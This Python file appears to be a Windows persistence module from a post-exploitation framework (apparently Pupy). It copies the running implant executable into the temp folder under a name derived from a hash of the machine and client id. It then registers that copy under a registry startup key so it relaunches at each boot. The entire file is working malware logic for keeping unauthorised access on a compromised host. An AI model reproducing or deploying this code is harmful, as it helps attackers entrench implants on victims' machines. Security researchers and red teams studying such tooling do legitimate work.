# -*- coding: utf-8 -*-

''' Execute persistence command '''

__dependencies__ = {
    'windows': ['pupwinutils.persistence'],
}

__arguments__ = {
    'src': 'Copy from',
    'directory': 'Where to store',
    'filename': 'Filename',
    'args': 'Command args',
    'regkey': 'Registry key name',
}

__compatibility__ = ('windows')

import sys
from shutil import copy
from os import path
from tempfile import gettempdir
from uuid import getnode
from hashlib import md5

from pupwinutils.persistence import add_registry_startup

def main(src=None, directory=None, filename=None, args=None, regkey=None, logger=None, pupy=None):
    if not directory:
        directory = gettempdir()
    else:
        directory = path.expanduser(directory)
        directory = path.expandvars(directory)

    mid = md5('node={} cid={}'.format(
            getnode(), pupy.cid)).hexdigest()

    if not filename:
        filename = mid[:8]+'.exe'

    if not src:
        src = sys.executable

    if not regkey:
        regkey = mid[-8:]

    filepath = path.join(directory, filename)

    cmd = filepath
    if args:
        cmd = '{} {}'.format(filepath, args)

    logger.debug('reg: {}'.format(regkey))
    logger.debug('src: {}'.format(src))
    logger.debug('dst: {}'.format(filepath))
    logger.debug('cmd: {}'.format(cmd))

    if not path.isfile(filepath):
        logger.debug('Copy: {} -> {}'.format(src, filepath))
        copy(src, filepath)

    if not add_registry_startup(cmd, regkey):
        logger.error('add_registry_startup failed')
